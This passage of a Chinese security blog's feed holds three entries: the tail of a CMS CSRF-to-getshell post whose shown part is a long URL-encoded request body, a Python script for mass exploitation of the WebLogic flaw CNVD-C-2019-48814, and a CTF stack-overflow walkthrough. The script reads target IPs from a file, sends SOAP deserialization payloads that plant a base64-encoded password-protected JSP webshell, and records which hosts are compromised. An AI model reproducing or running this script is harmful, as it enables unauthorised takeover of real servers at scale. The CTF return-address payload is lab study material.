ther+Accounts&amp;key%5B%5D=out&amp;value%5B%5D=Out&amp;key%5B%5D=ranking&amp;value%5B%5D=Ranking&amp;key%5B%5D=recommend&amp;value%5B%5D=Recommend&amp;key%5B%5D=tag&amp;value%5B%5D=Tag&amp;key%5B%5D=tags&amp;value%5B%5D=Tags&amp;key%5B%5D=read&amp;value%5B%5D=Read&amp;key%5B%5D=productdetails&amp;value%5B%5D=Product+Details&amp;key%5B%5D=service&amp;value%5B%5D=Service&amp;key%5B%5D=category&amp;value%5B%5D=Category&amp;key%5B%5D=allcategory&amp;value%5B%5D=All+Category&amp;key%5B%5D=stock&amp;value%5B%5D=Stock&amp;key%5B%5D=price&amp;value%5B%5D=Price&amp;key%5B%5D=sale&amp;value%5B%5D=Sale&amp;key%5B%5D=loginview&amp;value%5B%5D=Login+View&amp;key%5B%5D=readme&amp;value%5B%5D=Read+Me&amp;key%5B%5D=popularity&amp;value%5B%5D=Popularity&amp;key%5B%5D=details&amp;value%5B%5D=Details&amp;key%5B%5D=message&amp;value%5B%5D=Message&amp;key%5B%5D=original&amp;value%5B%5D=Original&amp;key%5B%5D=author&amp;value%5B%5D=Author&amp;key%5B%5D=pass&amp;value%5B%5D=Pass&amp;key%5B%5D=audit&amp;value%5B%5D=Audit&amp;key%5B%5D=return&amp;value%5B%5D=Return&amp;key%5B%5D=yes&amp;value%5B%5D=Yes&amp;key%5B%5D=no&amp;value%5B%5D=No&amp;key%5B%5D=modify&amp;value%5B%5D=Modify&amp;key%5B%5D=articlemodify&amp;value%5B%5D=Article+Modify&amp;key%5B%5D=type&amp;value%5B%5D=Type&amp;key%5B%5D=moreupload&amp;value%5B%5D=Up+to+upload&amp;key%5B%5D=success&amp;value%5B%5D=Success&amp;key%5B%5D=fail&amp;value%5B%5D=Fail&amp;key%5B%5D=upload&amp;value%5B%5D=Upload&amp;key%5B%5D=uploadtime&amp;value%5B%5D=Upload+Time&amp;key%5B%5D=contactus&amp;value%5B%5D=Contact+Us&amp;key%5B%5D=previouspage&amp;value%5B%5D=Prev&amp;key%5B%5D=nextpage&amp;value%5B%5D=Next&amp;key%5B%5D=firstpage&amp;value%5B%5D=First&amp;key%5B%5D=lastpage&amp;value%5B%5D=Last&amp;key%5B%5D=totalpage&amp;value%5B%5D=Total&amp;key%5B%5D=currentpage&amp;value%5B%5D=Current&amp;key%5B%5D=buy&amp;value%5B%5D=Buy&amp;key%5B%5D=mailverify&amp;value%5B%5D=Email+validation&amp;key%5B%5D=welcome&amp;value%5B%5D=Welcome&amp;key%5B%5D=close&amp;value%5B%5D=closed&amp;key%5B%5D=findpassword&amp;value%5B%5D=Find+Password&amp;key%5B%5D=contactmanager&amp;value%5B%5D=Contact+Manager&amp;key%5B%5D=orderdetaillogin&amp;value%5B%5D=For+order+details%2Cplease+visit+the+website.&amp;key%5B%5D=enterusername&amp;value%5B%5D=Please+enter+username%21&amp;key%5B%5D=enterpassword&amp;value%5B%5D=Please+enter+password%21&amp;key%5B%5D=enteremail&amp;value%5B%5D=Please+enter+Email%21&amp;key%5B%5D=emailerr&amp;value%5B%5D=Email+error%21&amp;key%5B%5D=entertitle&amp;value%5B%5D=Please+enter+title%21&amp;key%5B%5D=entercontent&amp;value%5B%5D=Please+enter+content%21&amp;key%5B%5D=selecttype&amp;value%5B%5D=Type+must+be+selected%21&amp;key%5B%5D=enterauthor&amp;value%5B%5D=Please+enter+author%21&amp;key%5B%5D=enterpasswords&amp;value%5B%5D=Please+confirm+the+password%21&amp;key%5B%5D=passworderr&amp;value%5B%5D=The+codes+don&amp;key%5B%5D=entercaptcha&amp;value%5B%5D=Please+enter+captcha%21&amp;key%5B%5D=captchaerr&amp;value%5B%5D=Captcha+error%21&amp;key%5B%5D=mailsenderr&amp;value%5B%5D=Mail+not+sent%21&amp;key%5B%5D=mailok&amp;value%5B%5D=Please+check+email%21&amp;key%5B%5D=pleasemailverify&amp;value%5B%5D=Please+check+email+for+verification%21&amp;key%5B%5D=mailverifycode&amp;value%5B%5D=Email+Authentication+Code&amp;key%5B%5D=mailcopylink&amp;value%5B%5D=Please+copy+the+following+link&amp;key%5B%5D=totalnum&amp;value%5B%5D=Total+Num&amp;key%5B%5D=updateok&amp;value%5B%5D=Update+successed%21&amp;key%5B%5D=updateno&amp;value%5B%5D=Failed+to+update%21&amp;key%5B%5D=payok&amp;value%5B%5D=Successful+payment%21&amp;key%5B%5D=payno&amp;value%5B%5D=Payment+Failed%21&amp;key%5B%5D=createempty&amp;value%5B%5D=Required+field+is+empty%21&amp;key%5B%5D=createok&amp;value%5B%5D=Create+successed%21&amp;key%5B%5D=createno&amp;value%5B%5D=Failed+to+create%21&amp;key%5B%5D=gotopay&amp;value%5B%5D=Go+to+pay%21&amp;key%5B%5D=untieok&amp;value%5B%5D=Untie+successed%21&amp;key%5B%5D=untieno&amp;value%5B%5D=Untie+failed%21&amp;key%5B%5D=delok&amp;value%5B%5D=Delete+successed%21&amp;key%5B%5D=delno&amp;value%5B%5D=Delete+failed%21&amp;key%5B%5D=regclose&amp;value%5B%5D=Website+registration+closed%21&amp;key%5B%5D=regmailerr&amp;value%5B%5D=Account+or+email+registered%21&amp;key%5B%5D=loginusererr&amp;value%5B%5D=Account+does+not+exist%21&amp;key%5B%5D=loginpasserr&amp;value%5B%5D=Account+or+password+does+not+match%21&amp;key%5B%5D=administratorreply&amp;value%5B%5D=The+administrator+has+not+responded%2C+please+wait+patiently.&amp;key%5B%5D=noscript&amp;value%5B%5D=Sorry%2C+your+browser+disabled+JavaScript%2C+it+may+not+be+able+to+use+some+of+the+site&amp;key%5B%5D=readmecontent&amp;value%5B%5D=We+guarantee+that+the+outer+packing+of+the+goods+is+in+good+condition+at+the+time+of+shipment.+When+you+receive+the+goods%2C+please+carefully+check+whether+the+invoice+and+the+goods+are+consistent+with+the+delivery+order.+If+you+find+that+the+goods+are+missing+or+damaged%2C+please+contact+our+customer+service+department+on+the+spot+when+the+delivery+personnel+are+still+on+the+scene%3B+If+you+find+that+the+package+is+damaged+or+the+goods+are+damaged+in+transit%2C+please+point+out+and+refuse+to+accept+it+on+the+spot.+After+refusal%2C+please+call+our+customer+service.+If+you+have+signed+for+it+or+someone+else+has+signed+for+it%2C+you+will+be+considered+as+the+packaging%2C+quantity+and+content+of+the+goods.+I+will+not+be+able+to+accept.&amp;key%5B%5D=copyright&amp;value%5B%5D=Copyright&amp;key%5B%5D=cssdisplay&amp;value%5B%5D=none&amp;key%5B%5D=test&amp;value%5B%5D=Test</span><br></pre></td></tr></table></figure><p>##CSRF配合上面的后台getshell</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/4-1.png" alt="4-1"></p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/uscmsimg/4-2.png" alt="4-2"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01-第一处：前台任意文件删除&quot;&gt;&lt;a href=&quot;#0x01-第一处：前台任意文件删除&quot; class=&quot;headerlink&quot; title=&quot;0x01 第一处：前台任意文件删除&quot;&gt;&lt;/a&gt;0x01 第一处：前台任意文件删除&lt;/h1&gt;&lt;p&gt;漏洞信息：前台myu
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>cnvd-c-2019-48814 批量getshell</title>
    <link href="https://vuln.top/2019/04/26/2019-48814/"/>
    <id>https://vuln.top/2019/04/26/2019-48814/</id>
    <published>2019-04-26T15:33:32.000Z</published>
    <updated>2019-04-26T15:57:42.110Z</updated>
    
    <content type="html"><![CDATA[<p>简单写一个通过 cnvd-c-2019-48814 批量getshell</p><p><code>扫描器可为个人和安全团队作为内部扫描器使用。扫描器切勿用于非法用途！！</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">#Author:fidcer</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">path=&apos;/_async/AsyncResponseService&apos;</span><br><span class="line"></span><br><span class="line">payload = &apos;&apos;&apos;</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">payload1 = &apos;&apos;&apos;</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;cmd&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;/c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4=  &gt; servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.txt&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#打开文件循环取IP并请求</span><br><span class="line">f = open(sys.argv[1],&apos;r&apos;)</span><br><span class="line">f1=open(&apos;vuln.txt&apos;,&apos;w&apos;)</span><br><span class="line">for ff in f:</span><br><span class="line">    try:</span><br><span class="line">        header=&#123;&apos;content-type&apos;:&apos;text/xml&apos;&#125;</span><br><span class="line">        a = requests.post(&apos;http://&apos;+ff.strip()+path,headers=header,data=payload,timeout=3)#默认全部为http请求</span><br><span class="line">        b = requests.post(&apos;http://&apos;+ff.strip()+path,headers=header,data=payload1,timeout=3)</span><br><span class="line">        r = requests.get(&apos;http://&apos;+ff.strip()+&apos;/_async/webshell.jsp&apos;,headers=header,timeout=3)</span><br><span class="line">        r1 = requests.get(&apos;http://&apos;+ff.strip()+&apos;/bea_wls_internal/webshell.jsp&apos;,headers=header,timeout=3)</span><br><span class="line"></span><br><span class="line">        #r=requests.post(&apos;http://&apos;+ff.strip()+path,headers=header,data=payload,timeout=3)</span><br><span class="line">        if(r.status_code==200):</span><br><span class="line">            print(&apos;[+]&apos;+ff.strip()+&apos;/_async/webshell.jsp&apos;)</span><br><span class="line">            f1.write(ff)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;[-]&apos;+ff.strip()+&apos;不存在漏洞&apos;)</span><br><span class="line">        if(r1.status_code==200):</span><br><span class="line">            print(&apos;[+]&apos;+ff.strip()+&apos;/bea_wls_internal/webshell.jsp&apos;)</span><br><span class="line">            f1.write(ff)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;[-]&apos;+ff.strip()+&apos;不存在漏洞&apos;)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        print(&apos;[-]&apos;+ff.strip()+&apos;连接超时&apos;)</span><br><span class="line">        continue</span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br><span class="line">print(&apos;漏洞的ip存放在vuln.txt&apos;)</span><br></pre></td></tr></table></figure><p>格式为：python 2019-48814.py 2.txt</p><p>2.txt下格式为：192.168.0.1:7001</p><p>webshell.jsp?pwd=123&amp;cmd=ls</p><p><img src="http://118.126.66.150/images/2019/04/26/924B6093-F8CF-4092-A6B9-C23B681D5D26.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简单写一个通过 cnvd-c-2019-48814 批量getshell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;扫描器可为个人和安全团队作为内部扫描器使用。扫描器切勿用于非法用途！！&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Retaddr</title>
    <link href="https://vuln.top/2019/04/19/Retaddr/"/>
    <id>https://vuln.top/2019/04/19/Retaddr/</id>
    <published>2019-04-19T04:00:37.000Z</published>
    <updated>2021-01-10T10:10:09.160Z</updated>
    
    <content type="html"><![CDATA[<p>###Retaddr</p><p>这是最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址</p><p>通过checksec检查编译的程序，程序为32位 开启NX保护。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/retaddr/F83B815C-B7E0-4A92-AE3C-605E6D50AFDE.jpg" alt="image-20190414200433236"></p><p>将程序放入32位的ida F5反编译，</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/retaddr/B933DFBA-1D00-479B-A5B0-87BD1DEF82B0.jpg" alt="B933DFBA-1D00-479B-A5B0-87BD1DEF82B0"></p><p>点开stkof函数，可以看到字符串距离ebp的长度为0x108</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/retaddr/A959A146-6E01-4FE4-A8B0-5028F779760E.jpg" alt="A959A146-6E01-4FE4-A8B0-5028F779760E"></p><p>那么栈的结构就为</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/retaddr/C2F68AF7-CE1D-4D78-A299-3A1AEE7CEA80.jpg" alt="C2F68AF7-CE1D-4D78-A299-3A1AEE7CEA80"></p><p>我们现在只需要找到正确的返回地址就能拿到flag，我们看到ida中有一个getflag的函数</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/retaddr/D866699F-0DD4-4777-8CD8-D2431CC6A79F.jpg" alt="D866699F-0DD4-4777-8CD8-D2431CC6A79F"></p><p>我们需要找到getflag函数的入口，在ida中按tab 发现getflag的地址为0x0804856B</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/retaddr/D5522D7C-8337-4562-BF5C-A212C2BD8D8B-2.jpg" alt="image-20190414201858448"></p><p>那么我们的payload就写为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x108*&apos;a&apos;+&apos;bbbb&apos;+0x0804856B</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/retaddr/B0C22B76-FF5F-44B5-A296-135444AF5A20.jpg" alt="B0C22B76-FF5F-44B5-A296-135444AF5A20"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; target = 0x0804856B</span><br><span class="line">&gt;&gt;&gt; r = remote(&apos;192.168.235.143&apos;,9992)</span><br><span class="line">[x] Opening connection to 192.168.235.143 on port 9992</span><br><span class="line">[x] Opening connection to 192.168.235.143 on port 9992: Trying 192.168.235.143</span><br><span class="line">[+] Opening connection to 192.168.235.143 on port 9992: Done</span><br><span class="line">&gt;&gt;&gt; payload = 0x108*&apos;a&apos;+&apos;bbbb&apos;+p32(target)</span><br><span class="line">&gt;&gt;&gt; r.sendline(payload)</span><br><span class="line">&gt;&gt;&gt; r.recvline()</span><br><span class="line">&apos;Do you know &quot;return address&quot;?\n&apos;</span><br><span class="line">&gt;&gt;&gt; r.recvline()</span><br><span class="line">&apos;You got the right return address!\n&apos;</span><br><span class="line">&gt;&gt;&gt; r.recvline()</span><br><span class="line">&apos;Take your flag and keep going: 123\n&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 target，即，此时的栈结构为</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/80DBDD44-F385-4B2D-BD91-0707261C8082.jpg" alt="80DBDD44-F385-4B2D-BD91-0707261C8082"></p><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式需要用pwn模块中的p32转换为机器语言</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;###Retaddr&lt;/p&gt;
&lt;p&gt;这是最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址&lt;/p&gt;
&lt;p&gt;通过checksec检查编译的程序，程序为32位 开启NX保护。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/H1
      
    
    </summary>
    
    
  </entry>
  
</feed>
